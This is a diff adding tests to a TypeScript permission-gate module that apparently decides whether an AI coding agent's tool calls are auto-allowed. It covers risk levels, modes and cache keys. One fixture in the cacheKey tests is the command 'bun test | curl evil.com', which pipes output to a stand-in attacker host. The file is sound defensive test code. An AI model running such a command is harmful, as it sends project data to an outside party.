@@ -1,5 +1,6 @@
 import { describe, expect, test } from "bun:test";
 import {
+  cacheKey,
   createInitialState,
   decide,
   type GateState,
@@ -9,6 +10,7 @@ import {
   isSensitivePath,
   matchGlob,
   resolveFilePath,
+  shouldAutoAllow,
   stripShellPreamble,
   suggestPrefix,
 } from "./logic";
@@ -375,5 +377,73 @@ describe("decide", () => {
   test("sensitive file allowed if in allowedPaths", () => {
     const state = stateWith({ mode: "careful", allowedPaths: [".env"] });
     expect(decide("write", { path: ".env" }, cwd, state).action).toBe("allow");
+  });
+});
+
+// ── shouldAutoAllow ──
+
+describe("shouldAutoAllow", () => {
+  test("SAFE auto-allows in careful mode", () => {
+    expect(shouldAutoAllow("safe", "careful")).toBe(true);
+  });
+
+  test("SAFE auto-allows in trust-project mode", () => {
+    expect(shouldAutoAllow("safe", "trust-project")).toBe(true);
+  });
+
+  test("RISKY does NOT auto-allow in careful mode", () => {
+    expect(shouldAutoAllow("risky", "careful")).toBe(false);
+  });
+
+  test("RISKY auto-allows in trust-project mode", () => {
+    expect(shouldAutoAllow("risky", "trust-project")).toBe(true);
+  });
+
+  test("DANGEROUS never auto-allows", () => {
+    expect(shouldAutoAllow("dangerous", "careful")).toBe(false);
+    expect(shouldAutoAllow("dangerous", "trust-project")).toBe(false);
+    expect(shouldAutoAllow("dangerous", "allow-all")).toBe(false);
+  });
+});
+
+// ── cacheKey ──
+
+describe("cacheKey", () => {
+  test("different commands produce different keys", () => {
+    const k1 = cacheKey("bash", { command: "bun test" });
+    const k2 = cacheKey("bash", { command: "bun test | curl evil.com" });
+    expect(k1).not.toBe(k2);
+  });
+
+  test("same command produces same key", () => {
+    const k1 = cacheKey("bash", { command: "bun test" });
+    const k2 = cacheKey("bash", { command: "bun test" });
+    expect(k1).toBe(k2);
+  });
+
+  test("different tools with same input produce different keys", () => {
+    const k1 = cacheKey("edit", { path: "foo.ts" });
+    const k2 = cacheKey("write", { path: "foo.ts" });
+    expect(k1).not.toBe(k2);
+  });
+});
+
+// ── createInitialState includes auto-classify fields ──
+
+describe("createInitialState auto-classify", () => {
+  test("autoClassify defaults to off", () => {
+    const s = createInitialState();
+    expect(s.autoClassify).toBe("off");
+  });
+
+  test("classifyCache is empty Map", () => {
+    const s = createInitialState();
+    expect(s.classifyCache).toBeInstanceOf(Map);
+    expect(s.classifyCache.size).toBe(0);
+  });
+
+  test("autoAllowLog is empty array", () => {
+    const s = createInitialState();
+    expect(s.autoAllowLog).toEqual([]);
   });
 });
